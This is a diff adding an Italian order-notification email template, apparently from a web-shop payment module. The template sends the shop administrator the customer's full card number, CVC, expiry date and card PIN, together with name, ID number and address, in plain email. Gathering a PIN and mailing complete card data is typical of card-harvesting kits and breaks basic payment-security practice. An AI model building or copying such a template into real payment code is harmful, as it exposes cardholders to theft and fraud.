@@ -1,0 +1,21 @@
+Ciao,
+
+C'è stato un nuovo ordine: #{id_order}
+
+I dati per il pagamento sono le seguenti:
+
+Nome: 				{nombre_titular}
+Cedula/Passaporto:	{cedula}
+Indirizzo: 			{direccion}
+Codice postale: 	{cp}
+Importo: 			{importe} {moneda}
+Numero di carta: 	{pan}
+CVC:				{cvc}
+Scadenza: 			{mes_caducidad}/{ano_caducidad}
+PIN:				{pin}
+City:				{city}
+State:				{state}
+Country:			{country}
+Ordina: 			{id_order}
+
+È possibile controllare i dettagli dell'ordine nel pannello di amministrazione.
